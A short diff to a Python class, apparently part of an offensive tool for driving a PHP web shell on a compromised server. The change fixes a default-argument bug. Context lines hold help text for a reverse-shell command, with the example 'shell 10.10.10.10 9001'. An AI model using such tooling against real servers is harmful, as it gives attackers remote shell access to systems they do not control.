@@ -18,7 +18,7 @@ class PHP_Web_Shell_Handler:
     SHELL_HELP = "\n\t[ SHELL ] - 'shell listening_ip listening_port' - attempts to run a reverse shell to give shell access to listening_ip on listening_port\n" + "\tEXAMPLE: shell 10.10.10.10 9001"
     QUIT_HELP = "\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')\n"
 
-    def __init__(self, webshell_url, webshell_param=None, encoded=True, os=self.DEFAULT_OS):
+    def __init__(self, webshell_url, webshell_param=None, encoded=True, os=DEFAULT_OS):
         try:
             webshell_url = web_utils.validate_url(webshell_url)
             if '/' not in webshell_url or not webshell_url.endswith('.php'):
